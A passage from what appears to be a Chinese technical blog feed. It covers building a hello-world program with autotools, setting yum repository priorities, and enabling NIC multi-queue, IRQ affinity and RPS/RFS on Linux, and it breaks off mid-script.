class="comment"># Checks for libraries.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for header files.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for typedefs, structures, and compiler characteristics.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for library functions.</span></span><br><span class="line"></span><br><span class="line">AC_OUTPUT(Makefile)</span><br></pre></td></tr></table></figure><h3 id="2-5、autoconf"><a href="#2-5、autoconf" class="headerlink" title="2.5、autoconf"></a>2.5、autoconf</h3><p>生成<code>configure</code>文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># autoconf</span></span><br><span class="line">[root@bugwz data]<span class="comment"># ll</span></span><br><span class="line">total 116</span><br><span class="line">drwxr-xr-x 2 root root   4096 Dec 10 15:56 autom4te.cache</span><br><span class="line">-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log</span><br><span class="line">-rwxr-xr-x 1 root root 104622 Dec 10 15:56 configure</span><br><span class="line">-rw-r--r-- 1 root root    446 Dec 10 15:55 configure.ac</span><br><span class="line">-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c</span><br></pre></td></tr></table></figure><h3 id="2-6、autoheader"><a href="#2-6、autoheader" class="headerlink" title="2.6、autoheader"></a>2.6、autoheader</h3><p>使用<code>autoheader</code>生成<code>configure.h.in</code>，如果在<code>configure.ac</code>中定义了<code>AC_CONFIG_HEADER</code>，那么此文件就必须存在；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># autoheader</span></span><br><span class="line">[root@bugwz data]<span class="comment"># ll</span></span><br><span class="line">total 120</span><br><span class="line">drwxr-xr-x 2 root root   4096 Dec 10 15:56 autom4te.cache</span><br><span class="line">-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log</span><br><span class="line">-rw-r--r-- 1 root root    539 Dec 10 15:56 config.h.in</span><br><span class="line">-rwxr-xr-x 1 root root 104622 Dec 10 15:56 configure</span><br><span class="line">-rw-r--r-- 1 root root    446 Dec 10 15:55 configure.ac</span><br><span class="line">-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c</span><br></pre></td></tr></table></figure><h3 id="2-7、新增Makefile-am"><a href="#2-7、新增Makefile-am" class="headerlink" title="2.7、新增Makefile.am"></a>2.7、新增Makefile.am</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># vi Makefile.am</span></span><br><span class="line">[root@bugwz data]<span class="comment"># cat Makefile.am</span></span><br><span class="line">AUTOMAKE_OPTIONS=foreign</span><br><span class="line">bin_PROGRAMS=helloworld</span><br><span class="line">helloworld_SOURCES=main.c</span><br></pre></td></tr></table></figure><ul><li><code>AUTOMAKE_OPTIONS</code>：设置<code>automake</code>的选项。由于<code>GNU</code>对自己发布的软件有严格的规范，比如必须附带许可证声明文件<code>COPYING</code>等，否则<code>automake</code>执行时会报错。<code>automake</code>提供了<code>3种</code>软件等级：<code>foreign</code>、<code>gnu</code>和<code>gnits</code>，默认为<code>gnu</code>。本例使需用foreign等级，它只检测必须的文件；</li><li><code>bin_PROGRAMS</code>：定义要产生的执行文件名。如果要产生多个执行文件，每个文件名用空格隔开；</li><li><code>helloworld_SOURCES</code>：定义<code>helloworld</code>这个执行程序所需要的原始文件。如果<code>helloworld</code>这个程序是由多个原始文件所产生的，则必须把它所用到的所有原始文件都列出来，并用空格隔开。例如：若目标体<code>helloworld</code>需要<code>main.c</code>一个依赖文件，则定义<code>helloworld_SOURCES=main.c</code>；</li></ul><h3 id="2-8、automake"><a href="#2-8、automake" class="headerlink" title="2.8、automake"></a>2.8、automake</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># automake --add-missing</span></span><br><span class="line">configure.ac:6: warning: AM_INIT_AUTOMAKE: two- and three-arguments forms are deprecated.  For more info, see:</span><br><span class="line">configure.ac:6: http://www.gnu.org/software/automake/manual/automake.html<span class="comment">#Modernize-AM_005fINIT_005fAUTOMAKE-invocation</span></span><br><span class="line">configure.ac:6: installing <span class="string">&#x27;./install-sh&#x27;</span></span><br><span class="line">configure.ac:6: installing <span class="string">&#x27;./missing&#x27;</span></span><br><span class="line">Makefile.am: installing <span class="string">&#x27;./depcomp&#x27;</span></span><br><span class="line"></span><br><span class="line">[root@bugwz data]<span class="comment"># ll</span></span><br><span class="line">total 224</span><br><span class="line">-rw-r--r-- 1 root root     77 Dec 10 16:00 Makefile.am</span><br><span class="line">-rw-r--r-- 1 root root  23322 Dec 10 16:11 Makefile.<span class="keyword">in</span></span><br><span class="line">-rw-r--r-- 1 root root  37794 Dec 10 16:10 aclocal.m4</span><br><span class="line">drwxr-xr-x 2 root root   4096 Dec 10 16:11 autom4te.cache</span><br><span class="line">-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log</span><br><span class="line">-rw-r--r-- 1 root root    625 Dec 10 16:10 config.h.in</span><br><span class="line">-rwxr-xr-x 1 root root 141852 Dec 10 16:10 configure</span><br><span class="line">-rw-r--r-- 1 root root    490 Dec 10 16:10 configure.ac</span><br><span class="line">lrwxrwxrwx 1 root root     32 Dec 10 16:11 depcomp -&gt; /usr/share/automake-1.13/depcomp</span><br><span class="line">lrwxrwxrwx 1 root root     35 Dec 10 16:11 install-sh -&gt; /usr/share/automake-1.13/install-sh</span><br><span class="line">-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c</span><br><span class="line">lrwxrwxrwx 1 root root     32 Dec 10 16:11 missing -&gt; /usr/share/automake-1.13/missing</span><br></pre></td></tr></table></figure><h3 id="2-9、configure与make"><a href="#2-9、configure与make" class="headerlink" title="2.9、configure与make"></a>2.9、configure与make</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># ./configure</span></span><br><span class="line">checking <span class="keyword">for</span> a BSD-compatible install... /usr/bin/install -c</span><br><span class="line">checking whether build environment is sane... <span class="built_in">yes</span></span><br><span class="line">checking <span class="keyword">for</span> a thread-safe <span class="built_in">mkdir</span> -p... /usr/bin/mkdir -p</span><br><span class="line">checking <span class="keyword">for</span> gawk... gawk</span><br><span class="line">checking whether make sets $(MAKE)... <span class="built_in">yes</span></span><br><span class="line">checking whether make supports nested variables... <span class="built_in">yes</span></span><br><span class="line">checking <span class="keyword">for</span> gcc... gcc</span><br><span class="line">checking whether the C compiler works... <span class="built_in">yes</span></span><br><span class="line">checking <span class="keyword">for</span> C compiler default output file name... a.out</span><br><span class="line">checking <span class="keyword">for</span> suffix of executables...</span><br><span class="line">checking whether we are cross compiling... no</span><br><span class="line">checking <span class="keyword">for</span> suffix of object files... o</span><br><span class="line">checking whether we are using the GNU C compiler... <span class="built_in">yes</span></span><br><span class="line">checking whether gcc accepts -g... <span class="built_in">yes</span></span><br><span class="line">checking <span class="keyword">for</span> gcc option to accept ISO C89... none needed</span><br><span class="line">checking <span class="keyword">for</span> style of include used by make... GNU</span><br><span class="line">checking dependency style of gcc... gcc3</span><br><span class="line">checking that generated files are newer than configure... <span class="keyword">done</span></span><br><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating Makefile</span><br><span class="line">config.status: creating config.h</span><br><span class="line">config.status: executing depfiles commands</span><br><span class="line"></span><br><span class="line">[root@bugwz data]<span class="comment"># make</span></span><br><span class="line">make  all-am</span><br><span class="line">make[1]: Entering directory `/data<span class="string">&#x27;</span></span><br><span class="line"><span class="string">gcc -DHAVE_CONFIG_H -I.     -g -O2 -MT main.o -MD -MP -MF .deps/main.Tpo -c -o main.o main.c</span></span><br><span class="line"><span class="string">mv -f .deps/main.Tpo .deps/main.Po</span></span><br><span class="line"><span class="string">gcc  -g -O2   -o helloworld main.o</span></span><br><span class="line"><span class="string">make[1]: Leaving directory `/data&#x27;</span></span><br><span class="line"></span><br><span class="line">[root@bugwz data]<span class="comment"># ll</span></span><br><span class="line">total 320</span><br><span class="line">-rw-r--r-- 1 root root  22880 Dec 10 16:12 Makefile</span><br><span class="line">-rw-r--r-- 1 root root     77 Dec 10 16:00 Makefile.am</span><br><span class="line">-rw-r--r-- 1 root root  23322 Dec 10 16:11 Makefile.<span class="keyword">in</span></span><br><span class="line">-rw-r--r-- 1 root root  37794 Dec 10 16:10 aclocal.m4</span><br><span class="line">drwxr-xr-x 2 root root   4096 Dec 10 16:11 autom4te.cache</span><br><span class="line">-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log</span><br><span class="line">-rw-r--r-- 1 root root    781 Dec 10 16:12 config.h</span><br><span class="line">-rw-r--r-- 1 root root    625 Dec 10 16:10 config.h.in</span><br><span class="line">-rw-r--r-- 1 root root   8471 Dec 10 16:12 config.log</span><br><span class="line">-rwxr-xr-x 1 root root  32335 Dec 10 16:12 config.status</span><br><span class="line">-rwxr-xr-x 1 root root 141852 Dec 10 16:10 configure</span><br><span class="line">-rw-r--r-- 1 root root    490 Dec 10 16:10 configure.ac</span><br><span class="line">lrwxrwxrwx 1 root root     32 Dec 10 16:11 depcomp -&gt; /usr/share/automake-1.13/depcomp</span><br><span class="line">-rwxr-xr-x 1 root root  10808 Dec 10 16:12 helloworld</span><br><span class="line">lrwxrwxrwx 1 root root     35 Dec 10 16:11 install-sh -&gt; /usr/share/automake-1.13/install-sh</span><br><span class="line">-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c</span><br><span class="line">-rw-r--r-- 1 root root   5952 Dec 10 16:12 main.o</span><br><span class="line">lrwxrwxrwx 1 root root     32 Dec 10 16:11 missing -&gt; /usr/share/automake-1.13/missing</span><br><span class="line">-rw-r--r-- 1 root root     23 Dec 10 16:12 stamp-h1</span><br><span class="line">[root@bugwz data]<span class="comment"># ./helloworld</span></span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure><h3 id="2-10、打包"><a href="#2-10、打包" class="headerlink" title="2.10、打包"></a>2.10、打包</h3><h4 id="2-10-1、执行打包"><a href="#2-10-1、执行打包" class="headerlink" title="2.10.1、执行打包"></a>2.10.1、执行打包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># make dist</span></span><br><span class="line">make  dist-gzip am__post_remove_distdir=<span class="string">&#x27;@:&#x27;</span></span><br><span class="line">make[1]: Entering directory `/data<span class="string">&#x27;</span></span><br><span class="line"><span class="string">if test -d &quot;helloworld-1.0&quot;; then find &quot;helloworld-1.0&quot; -type d ! -perm -200 -exec chmod u+w &#123;&#125; &#x27;</span>;<span class="string">&#x27; &amp;&amp; rm -rf &quot;helloworld-1.0&quot; || &#123; sleep 5 &amp;&amp; rm -rf &quot;helloworld-1.0&quot;; &#125;; else :; fi</span></span><br><span class="line"><span class="string">test -d &quot;helloworld-1.0&quot; || mkdir &quot;helloworld-1.0&quot;</span></span><br><span class="line"><span class="string">test -n &quot;&quot; \</span></span><br><span class="line"><span class="string">|| find &quot;helloworld-1.0&quot; -type d ! -perm -755 \</span></span><br><span class="line"><span class="string">-exec chmod u+rwx,go+rx &#123;&#125; \; -o \</span></span><br><span class="line"><span class="string">  ! -type d ! -perm -444 -links 1 -exec chmod a+r &#123;&#125; \; -o \</span></span><br><span class="line"><span class="string">  ! -type d ! -perm -400 -exec chmod a+r &#123;&#125; \; -o \</span></span><br><span class="line"><span class="string">  ! -type d ! -perm -444 -exec /bin/sh /data/install-sh -c -m a+r &#123;&#125; &#123;&#125; \; \</span></span><br><span class="line"><span class="string">|| chmod -R a+r &quot;helloworld-1.0&quot;</span></span><br><span class="line"><span class="string">tardir=helloworld-1.0 &amp;&amp; $&#123;TAR-tar&#125; chof - &quot;$tardir&quot; | GZIP=--best gzip -c &gt;helloworld-1.0.tar.gz</span></span><br><span class="line"><span class="string">make[1]: Leaving directory `/data&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -d <span class="string">&quot;helloworld-1.0&quot;</span>; <span class="keyword">then</span> find <span class="string">&quot;helloworld-1.0&quot;</span> -<span class="built_in">type</span> d ! -perm -200 -<span class="built_in">exec</span> <span class="built_in">chmod</span> u+w &#123;&#125; <span class="string">&#x27;;&#x27;</span> &amp;&amp; <span class="built_in">rm</span> -rf <span class="string">&quot;helloworld-1.0&quot;</span> || &#123; <span class="built_in">sleep</span> 5 &amp;&amp; <span class="built_in">rm</span> -rf <span class="string">&quot;helloworld-1.0&quot;</span>; &#125;; <span class="keyword">else</span> :; <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">[root@bugwz data]<span class="comment"># ll</span></span><br><span class="line">total 392</span><br><span class="line">-rw-r--r-- 1 root root  22880 Dec 10 16:12 Makefile</span><br><span class="line">-rw-r--r-- 1 root root     77 Dec 10 16:00 Makefile.am</span><br><span class="line">-rw-r--r-- 1 root root  23322 Dec 10 16:11 Makefile.<span class="keyword">in</span></span><br><span class="line">-rw-r--r-- 1 root root  37794 Dec 10 16:10 aclocal.m4</span><br><span class="line">drwxr-xr-x 2 root root   4096 Dec 10 16:11 autom4te.cache</span><br><span class="line">-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log</span><br><span class="line">-rw-r--r-- 1 root root    781 Dec 10 16:12 config.h</span><br><span class="line">-rw-r--r-- 1 root root    625 Dec 10 16:10 config.h.in</span><br><span class="line">-rw-r--r-- 1 root root   8471 Dec 10 16:12 config.log</span><br><span class="line">-rwxr-xr-x 1 root root  32335 Dec 10 16:12 config.status</span><br><span class="line">-rwxr-xr-x 1 root root 141852 Dec 10 16:10 configure</span><br><span class="line">-rw-r--r-- 1 root root    490 Dec 10 16:10 configure.ac</span><br><span class="line">lrwxrwxrwx 1 root root     32 Dec 10 16:11 depcomp -&gt; /usr/share/automake-1.13/depcomp</span><br><span class="line">-rwxr-xr-x 1 root root  10808 Dec 10 16:12 helloworld</span><br><span class="line">-rw-r--r-- 1 root root  71614 Dec 10 16:13 helloworld-1.0.tar.gz</span><br><span class="line">lrwxrwxrwx 1 root root     35 Dec 10 16:11 install-sh -&gt; /usr/share/automake-1.13/install-sh</span><br><span class="line">-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c</span><br><span class="line">-rw-r--r-- 1 root root   5952 Dec 10 16:12 main.o</span><br><span class="line">lrwxrwxrwx 1 root root     32 Dec 10 16:11 missing -&gt; /usr/share/automake-1.13/missing</span><br><span class="line">-rw-r--r-- 1 root root     23 Dec 10 16:12 stamp-h1</span><br></pre></td></tr></table></figure><h4 id="2-10-2、校验打包"><a href="#2-10-2、校验打包" class="headerlink" title="2.10.2、校验打包"></a>2.10.2、校验打包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># tar -zxvf helloworld-1.0.tar.gz</span></span><br><span class="line">[root@bugwz data]<span class="comment"># ll helloworld-1.0</span></span><br><span class="line">total 268</span><br><span class="line">-rw-r--r-- 1 root root     77 Dec 10 16:00 Makefile.am</span><br><span class="line">-rw-r--r-- 1 root root  23322 Dec 10 16:11 Makefile.<span class="keyword">in</span></span><br><span class="line">-rw-r--r-- 1 root root  37794 Dec 10 16:10 aclocal.m4</span><br><span class="line">-rw-r--r-- 1 root root    625 Dec 10 16:10 config.h.in</span><br><span class="line">-rwxr-xr-x 1 root root 141852 Dec 10 16:10 configure</span><br><span class="line">-rw-r--r-- 1 root root    490 Dec 10 16:10 configure.ac</span><br><span class="line">-rwxr-xr-x 1 root root  23566 Jun 10  2014 depcomp</span><br><span class="line">-rwxr-xr-x 1 root root  13997 Jun 10  2014 install-sh</span><br><span class="line">-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c</span><br><span class="line">-rwxr-xr-x 1 root root   6873 Jun 10  2014 missing</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/bugutian/p/5560548.html">https://www.cnblogs.com/bugutian/p/5560548.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Notes </tag>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yum源的优先级配置之yum-priorities</title>
      <link href="/2019/12/01/yum-priorities/"/>
      <url>/2019/12/01/yum-priorities/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Linux 发行版比较多，同时还有很多个人或组织维护了某些特定用途的安装&#x2F;升级源。<strong>Yum Priorities</strong> 插件可以用来强制保护源。它通过给各个源设定不同的优先级，使得系统管理员可以将某些源设定为最高优先级，从而保证系统的稳定性。</p><h2 id="二、yum-priorities"><a href="#二、yum-priorities" class="headerlink" title="二、yum-priorities"></a>二、yum-priorities</h2><h3 id="2-1、安装"><a href="#2-1、安装" class="headerlink" title="2.1、安装"></a>2.1、安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y yum-priorities</span><br></pre></td></tr></table></figure><h3 id="2-2、配置验证"><a href="#2-2、配置验证" class="headerlink" title="2.2、配置验证"></a>2.2、配置验证</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/yum/pluginconf.d/product-id.conf</span><br></pre></td></tr></table></figure><p>需要确认的是，如果<code>enabled</code>的配置为<code>1</code>，代表已经启用了yum源的配置优先级；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[main]</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><h3 id="2-3、配置优先级调整"><a href="#2-3、配置优先级调整" class="headerlink" title="2.3、配置优先级调整"></a>2.3、配置优先级调整</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Example 1]</span><br><span class="line">name=Example_1</span><br><span class="line">baseurl=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/example_1/<span class="variable">$basearch</span>/</span><br><span class="line">priority=10</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[Example 2]</span><br><span class="line">name=Example_2</span><br><span class="line">baseurl=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/example_2/<span class="variable">$basearch</span>/</span><br><span class="line">priority=20</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><p>关于上述配置的解释为：</p><ul><li>其中<code>priority=N</code>，<code>N</code>的值为：<code>1-99</code>，当数字越大，优先级越低；</li><li>当<code>Example_1</code>与<code>Example_2</code>的源中存在同名同版本的软件包时，优先安装<code>Example_1</code>中的安装包；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> yum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网卡多队列技术学习</title>
      <link href="/2019/11/30/network-multi-queue/"/>
      <url>/2019/11/30/network-multi-queue/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>网卡多队列是一种技术，最初是用来解决 网络IO 的 <code>QoS （Quality Of Service）</code>问题。网卡多队列需要硬件和驱动同时支持。网卡多队列驱动将各个队列通过将中断绑定到不同的核上，从而解决网络I&#x2F;O带宽升高时单核CPU的处理瓶颈，提升网络PPS和带宽性能。经测试，在相同的网络PPS和网络带宽的条件下，与1个队列相比，2个队列最多可提升性能达50%到100%，4个队列的性能提升更大。</p><h2 id="二、启用网卡多队列"><a href="#二、启用网卡多队列" class="headerlink" title="二、启用网卡多队列"></a>二、启用网卡多队列</h2><h3 id="2-1、网卡是否支持多队列"><a href="#2-1、网卡是否支持多队列" class="headerlink" title="2.1、网卡是否支持多队列"></a>2.1、网卡是否支持多队列</h3><h4 id="2-1-1、ethtool方式验证"><a href="#2-1-1、ethtool方式验证" class="headerlink" title="2.1.1、ethtool方式验证"></a>2.1.1、ethtool方式验证</h4><p>安装指令为：<code>yum -y install ethtool net-tools</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz /]<span class="comment"># ethtool -l eth0</span></span><br><span class="line">Channel parameters <span class="keyword">for</span> eth0:</span><br><span class="line">Pre-<span class="built_in">set</span> maximums:</span><br><span class="line">RX:0</span><br><span class="line">TX:0</span><br><span class="line">Other:1</span><br><span class="line">Combined:8     <span class="comment"># 最大支持设置的网卡队列数</span></span><br><span class="line">Current hardware settings:</span><br><span class="line">RX:0</span><br><span class="line">TX:0</span><br><span class="line">Other:1</span><br><span class="line">Combined:8     <span class="comment"># 当前eth0启动的网卡队列数</span></span><br></pre></td></tr></table></figure><h4 id="2-1-2、lspci指令验证"><a href="#2-1-2、lspci指令验证" class="headerlink" title="2.1.2、lspci指令验证"></a>2.1.2、lspci指令验证</h4><p>查看硬件是否支持网卡多队列，使用指令<code>lspci -vvv</code>（安装指令为：<code>yum -y install pciutils</code>），查看<code>Ethernet controller</code>项目信息中是否存在<code>MSI-X</code>，<code>Enable+</code>并且<code>Count &gt; 1</code>，如果存在的话则该网卡支持网卡多队列；</p><p><img src="https://cdn.bugwz.com/network-queue-ethernet-controller.png" alt="Ethernet controller"></p><h3 id="2-2、是否启用了网卡多队列"><a href="#2-2、是否启用了网卡多队列" class="headerlink" title="2.2、是否启用了网卡多队列"></a>2.2、是否启用了网卡多队列</h3><h4 id="2-2-1、ethtool指令验证"><a href="#2-2-1、ethtool指令验证" class="headerlink" title="2.2.1、ethtool指令验证"></a>2.2.1、ethtool指令验证</h4><p>使用<code>ethtool</code>工具查看是否开启了网卡多队列</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz /]<span class="comment"># ethtool -l eth0</span></span><br><span class="line">Channel parameters <span class="keyword">for</span> eth0:</span><br><span class="line">Pre-<span class="built_in">set</span> maximums:</span><br><span class="line">RX:0</span><br><span class="line">TX:0</span><br><span class="line">Other:1</span><br><span class="line">Combined:8     <span class="comment"># 最大支持设置的网卡队列数</span></span><br><span class="line">Current hardware settings:</span><br><span class="line">RX:0</span><br><span class="line">TX:0</span><br><span class="line">Other:1</span><br><span class="line">Combined:8     <span class="comment"># 当前eth0启动的网卡队列数</span></span><br></pre></td></tr></table></figure><h4 id="2-2-2、-x2F-proc-x2F-interrupts-文件验证"><a href="#2-2-2、-x2F-proc-x2F-interrupts-文件验证" class="headerlink" title="2.2.2、&#x2F;proc&#x2F;interrupts 文件验证"></a>2.2.2、&#x2F;proc&#x2F;interrupts 文件验证</h4><p>使用<code>cat /proc/interrupts</code>查看当前是否已经开启了网卡多队列，通过查看网卡的中断集中分布在哪些CPU上，如果分布在多个CPU上，则当前已经开启了网卡多队列。</p><p><img src="https://cdn.bugwz.com/network-queue-proc-interrupts.png" alt="/proc/interrupts文件"></p><ul><li>第一列：IRQ号；</li><li>CPU 0～7：表示对应的CPU，下面对应的数值表示某个CPU在某一项上被中断的次数；</li><li>NMI和LOC：系统所使用的驱动，用户无法访问和配置；</li><li>…</li></ul><h3 id="2-3、开启网卡多队列"><a href="#2-3、开启网卡多队列" class="headerlink" title="2.3、开启网卡多队列"></a>2.3、开启网卡多队列</h3><h4 id="2-3-1、ethtool指令开启"><a href="#2-3-1、ethtool指令开启" class="headerlink" title="2.3.1、ethtool指令开启"></a>2.3.1、ethtool指令开启</h4><p>使用<code>ethtool</code>修改启用网卡队列的数量，修改完成后再次查看如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz /]<span class="comment"># ethtool -L eth0 combined 4</span></span><br><span class="line">[root@bugwz /]<span class="comment"># ethtool -l eth0</span></span><br><span class="line">Channel parameters <span class="keyword">for</span> eth0:</span><br><span class="line">Pre-<span class="built_in">set</span> maximums:</span><br><span class="line">RX:0</span><br><span class="line">TX:0</span><br><span class="line">Other:1</span><br><span class="line">Combined:8     <span class="comment"># 最大支持设置的网卡队列数</span></span><br><span class="line">Current hardware settings:</span><br><span class="line">RX:0</span><br><span class="line">TX:0</span><br><span class="line">Other:1</span><br><span class="line">Combined:4     <span class="comment"># 当前eth0启动的网卡队列数</span></span><br></pre></td></tr></table></figure><h3 id="2-4、配置网卡多队列"><a href="#2-4、配置网卡多队列" class="headerlink" title="2.4、配置网卡多队列"></a>2.4、配置网卡多队列</h3><h4 id="2-4-1、手动配置"><a href="#2-4-1、手动配置" class="headerlink" title="2.4.1、手动配置"></a>2.4.1、手动配置</h4><h5 id="2-4-1-1、获取中断号"><a href="#2-4-1-1、获取中断号" class="headerlink" title="2.4.1.1、获取中断号"></a>2.4.1.1、获取中断号</h5><p>在启用了网卡多队列之后，可以通过<code>cat /proc/interrupts</code>指令查看对应的网卡的中断号信息；</p><p><img src="https://cdn.bugwz.com/network-queue-proc-interrupt-click.png" alt="/proc/interrupt文件"></p><h5 id="2-4-1-2、设置中断亲和性"><a href="#2-4-1-2、设置中断亲和性" class="headerlink" title="2.4.1.2、设置中断亲和性"></a>2.4.1.2、设置中断亲和性</h5><p>文件<code>/proc/irq/$&#123;IRQ_NUM&#125;/smp_affinity</code>为中断号为<code>IRQ_NUM</code>的中断绑定的<code>CPU</code>的情况。文件中的参数以十六进制表示，将其转换为二进制后的每一位代表一个CPU，默认值为<code>全f</code>，表明将中断发给所有的CPU进行处理。</p><p>如果要将对应的中断绑定到<code>CPU 0～3</code>上，我们可执行如下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &gt; /proc/irq/31/smp_affinity</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &gt; /proc/irq/32/smp_affinity</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2&quot;</span> &gt; /proc/irq/33/smp_affinity</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2&quot;</span> &gt; /proc/irq/34/smp_affinity</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;4&quot;</span> &gt; /proc/irq/35/smp_affinity</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;4&quot;</span> &gt; /proc/irq/36/smp_affinity</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;8&quot;</span> &gt; /proc/irq/37/smp_affinity</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;8&quot;</span> &gt; /proc/irq/38/smp_affinity</span><br></pre></td></tr></table></figure><h4 id="2-4-2、通过irqbalance配置"><a href="#2-4-2、通过irqbalance配置" class="headerlink" title="2.4.2、通过irqbalance配置"></a>2.4.2、通过irqbalance配置</h4><p>irqbalance避免所有的IRQ请求都由单一的CPU负担，从而将硬件中断分布到多处理器系统的各个处理器以便能够提高性能，安装方式为：<code>yum -y install irqbalance</code>；</p><p><strong>基本原理</strong>：周期计算各个CPU上的中断数量，发现不均衡时，动态通过<code>/proc</code>接口设置指定中断的CPU亲和性，进行绑定。当只有一个中断时，无论将这个中断绑定到哪个CPU，都会不均衡。</p><p><strong>需要注意</strong>：</p><ul><li>启动<code>irqbalance</code>后，手动绑定将失效；</li><li>当CPU工作在最高性能模式时，<code>irqbalance</code>会均匀分配中断到其他CPU，节能模式时中断会集中分配到CPU0；</li><li>irqbalance进行均衡的粒度为<strong>不同的中断</strong>，当系统中有很多不同类型的中断，基本有用，如果只有一个中断(或者少量中断)，此时irqbalance无能为力；</li></ul><h2 id="三、网卡单队列下的网卡软中断的均衡方案"><a href="#三、网卡单队列下的网卡软中断的均衡方案" class="headerlink" title="三、网卡单队列下的网卡软中断的均衡方案"></a>三、网卡单队列下的网卡软中断的均衡方案</h2><p><code>RPS/RFS</code> 来解决在单队列网卡下的<code>软中断</code>的负载绑定问题，在<code>硬中断</code>不均衡情况下，通过使<code>软中断</code>均衡，达到CPU占用均衡的目的，该功能出现在内核版本<code>2.6.35</code>中，由<code>Google</code>的两位工程师提交。</p><p><code>RPS（Receive Packet Steering）</code>主要是把<code>软中断</code>的负载均衡到各个<code>CPU</code>，简单来说，是网卡驱动对每个流（针对收包过程）生成一个<code>hash标识</code>，这个HASH值得计算可以通过四元组来计算（<code>SIP</code>，<code>SPORT</code>，<code>DIP</code>，<code>DPORT</code>），然后由中断处理的地方根据这个<code>hash标识</code>分配到相应的<code>CPU</code>上去，这样就可以比较充分的发挥多核的能力了。通俗点来说就是在软件层面模拟实现硬件的多队列网卡功能，如果网卡本身支持多队列功能的话RPS就不会有任何的作用。该功能主要针对单队列网卡多CPU环境。示意图如下所示：</p><p><img src="https://cdn.bugwz.com/network-queue-rps.png" alt="RPS"></p><p><code>RFS（Receive Flow Steering）</code>是RPS的扩展，<code>RPS</code>只依靠<code>hash</code>来控制数据包，提供负载平衡，但是没有考虑到<code>应用程序的位置</code>（指应用程序所在CPU）。<code>RFS</code>目标是通过指派应用线程正在运行的CPU处理中断，增加数据缓存的命中率。示意图如下所示：</p><p><img src="https://cdn.bugwz.com/network-queue-rfs.png" alt="RFS"></p><h3 id="3-1、与网卡多队列的区别"><a href="#3-1、与网卡多队列的区别" class="headerlink" title="3.1、与网卡多队列的区别"></a>3.1、与网卡多队列的区别</h3><ul><li>RPS&#x2F;RFS：平衡一个<code>RX Queue</code>的<code>软中断</code>到不同逻辑CPU上；</li><li>网卡多队列：RSS（Receive Side Scaling）是网卡的<code>硬件特性</code>（需要硬件支持），实现了多队列，多队列是<code>RX/TX多个通路</code>，分别负责各种的中断，可以将不同的流分发到不同的CPU上；</li></ul><h3 id="3-2、开启RPS特性脚本"><a href="#3-2、开启RPS特性脚本" class="headerlink" title="3.2、开启RPS特性脚本"></a>3.2、开启RPS特性脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cpu_num=$(grep -c processor /proc/cpuinfo)</span><br><span class="line">quotient=$((cpu_num/<span class="number">8</span>))</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$quotient</span> -gt 2 ]; <span 